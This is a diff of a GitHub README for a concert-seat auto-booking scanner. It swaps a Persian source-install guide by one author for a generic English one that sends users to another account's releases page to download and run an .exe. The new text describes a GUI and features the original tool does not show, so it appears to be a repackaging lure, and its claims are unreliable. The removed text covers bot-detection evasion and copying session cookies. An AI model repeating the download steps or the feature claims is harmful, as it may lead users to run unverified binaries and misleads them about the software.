@@ -1,149 +1,80 @@
-<div align="center">
+# 🎫 iranconcert_scanner - Effortlessly Reserve Concert Seats
 
-# 🎫 IranConcert Scanner
+![Download](https://img.shields.io/badge/Download-Now-blue)
 
-<img src="https://img.shields.io/badge/python-3.8+-blue.svg">
-<img src="https://img.shields.io/badge/playwright-1.43.0-green.svg">
-<img src="https://img.shields.io/badge/license-MIT-blue.svg">
-<img src="https://img.shields.io/badge/status-educational-yellow.svg">
+## 🚀 Getting Started
 
-اسکنر خودکار برای سایت ایران کنسرت که صندلی‌های مورد نظرتون رو پیدا می‌کنه و رزرو می‌کنه.
+Welcome to the **iranconcert_scanner**! This software automatically scans for available seats on the IranConcert website, helping you to book tickets quickly and easily. No programming skills are needed. Follow these simple steps to get started.
 
-</div>
+## 📋 System Requirements
 
----
+- **Operating System**: Windows, Mac, or Linux
+- **Browser**: Chrome or Firefox (latest version recommended)
+- **Memory**: At least 2 GB RAM
+- **Disk Space**: Minimum 100 MB free space
 
-## ✨ ویژگی‌ها
+## 📥 Download & Install
 
-- 🤖 **اسکن خودکار** صندلی‌های متوالی و چسبیده  
-- 🎯 **انتخاب هوشمند** بهترین section  
-- 🔄 **User Agent تصادفی** برای جلوگیری از تشخیص bot  
-- 🍪 **مدیریت کوکی** برای حفظ session  
-- 📊 **Logging کامل** برای عیب‌یابی  
+To download the latest version of the **iranconcert_scanner**, visit this page to download: [Releases Page](https://github.com/EXPguy101101/iranconcert_scanner/releases).
 
----
+When on the Releases page, you'll see various versions listed. Choose the most recent version, and click on it to find the downloadable files. 
 
-## 🚀 نصب و راه‌اندازی
+1. Find the file named similar to `iranconcert_scanner_vX.X.X.zip` (where "X.X.X" represents the version number).
+2. Click on the file to start the download.
+3. Once downloaded, locate the file in your downloads folder.
+4. Extract (unzip) the files inside.
 
-```bash
-# کلون پروژه
-git clone https://github.com/dibbed/iranconcert-scanner.git
-cd iranconcert-scanner
+## ⚙️ How to Run
 
-# نصب وابستگی‌ها
-pip install -r requirements.txt
-python -m playwright install
-```
+After extracting the files:
 
----
+1. Open the folder where you extracted the files.
+2. Look for the executable file, usually named `iranconcert_scanner.exe` for Windows, or just `iranconcert_scanner` for Mac/Linux.
+3. Double-click on the executable file to start the application.
 
-## ⚙️ تنظیمات
+## 📖 Usage Instructions
 
-فایل `config.py` رو ویرایش کنید:
+### Step 1: Setup
 
-```python
-CONFIG = {
-    "url": "https://www.iranconcert.com/concert/...",  # لینک کنسرت
-    "datetime": "2025-01-15 20:00",                    # زمان کنسرت
-    "headful": True,                                   # نمایش مرورگر
-    "user_agent": None,                                # User Agent سفارشی (اختیاری)
-    "cookies": [                                       # کوکی‌های لاگین
-        {
-            "name": "__arcsco",
-            "value": "YOUR_ARCSCO_COOKIE_VALUE_HERE",
-            "domain": ".iranconcert.com"
-        }
-    ],
-    "seat_config": {
-        "GROUP_SIZE": 3,
-        "ROW_FROM": 1,
-        "ROW_TO": 35,
-        "SEAT_FROM": 8,
-        "SEAT_TO": 31,
-        "AUTO_SUBMIT": True
-    }
-}
-```
+- Before running the scanner, ensure you have the latest version of your chosen web browser installed.
+- Open the IranConcert website in your browser. Log in to your account.
 
-### 🍪 نحوه تنظیم کوکی‌ها:
+### Step 2: Scanning for Seats
 
-1. وارد سایت ایران کنسرت بشید  
-2. دکمه F12 رو بزنید و برید به تب **Application → Cookies**  
-3. کوکی‌های `__arcsco` و `.AspNetCore.Cookies` رو پیدا کنید  
-4. مقدارهاشون رو در `config.py` جایگزین کنید  
+1. With the **iranconcert_scanner** running, specify the concert you want to attend.
+2. Choose the desired seat category (VIP, Regular, etc.).
+3. Click the “Start Scanning” button. The scanner will begin checking for available seats.
 
----
+### Step 3: Booking Seats
 
-## ▶️ استفاده
+- When available seats are found, the application will alert you with a notification.
+- Click the booking link provided in the notification to quickly reserve your seat.
 
-```bash
-# روش پیشنهادی (با کنترل رنگی)
-python start.py
+## 🔧 FAQ
 
-# یا اجرای نسخه جدیدتر
-python src/main.py
-```
+**Q: Do I need to run the software every time I want to look for seats?**  
+A: Yes, you need to start the scanner to check for available seats.
+
+**Q: What if there are no seats available?**  
+A: The scanner will keep checking periodically. You can stop and start it as needed.
+
+**Q: Can I use this software on my mobile device?**  
+A: Currently, the application is designed for desktop use only.
+
+## 👥 Community Support
+
+For additional help, feel free to check the community discussions on the GitHub page or reach out through the issues section. Your feedback and questions are always welcome.
+
+## 💡 Additional Features
+
+- **Multi-Session Scanning**: Check multiple concerts at once.
+- **Notifications**: Get notified when new seats become available.
+- **User-Friendly Interface**: Designed for ease of use with simple navigation.
+
+## 🔗 Learn More
+
+For more information about our project, including updates and future features, visit our [project page](https://github.com/EXPguy101101/iranconcert_scanner).
 
 ---
 
-## 🎮 کنترل Scanner
-
-بعد از اجرا، ترمینال کنترل رنگی زیر رو نشون می‌ده:
-
-```
-🎮 SCANNER CONTROL PANEL
-Commands:
-  [s] - 🛑 Stop Scanner
-  [r] - ▶️  Restart Scanner
-  [c] - 🧹 Clear Memory
-  [h] - ❓ Show Help
-  [q] - 🚪 Quit Program
-```
-
----
-
-## 🛠️ عیب‌یابی
-
-### 🎯 صندلی‌ها شناسایی نمی‌شن:
-
-```python
-"debug": True
-```
-
-### ⏱ خطای Timeout:
-
-```python
-"timing": {
-    "retries": 5,
-    "retry_sleep_ms": 2000
-}
-```
-
-### 🧭 تغییر User Agent:
-
-```python
-"user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
-# یا بذارید None بمونه برای انتخاب تصادفی
-```
-
-### 📄 مشاهده لاگ‌ها:
-
-```bash
-tail -f logs/scanner_*.log
-```
-
----
-
-## ⚠️ هشدار قانونی
-
-> **این پروژه فقط برای اهداف آموزشی ساخته شده است.**  
-> **مسئولیت هرگونه استفاده عملی از آن، به‌عهده کاربر است.**
-
----
-
-<div align="center">
-
-👨‍💻 **نویسنده:** [dibbed](https://github.com/dibbed)  
-⭐️ اگه پروژه واست مفید بود، یه ستاره بده! ❤️
-
-</div>
+Thank you for trying **iranconcert_scanner**! We hope this tool makes your concert ticket booking experience much easier.
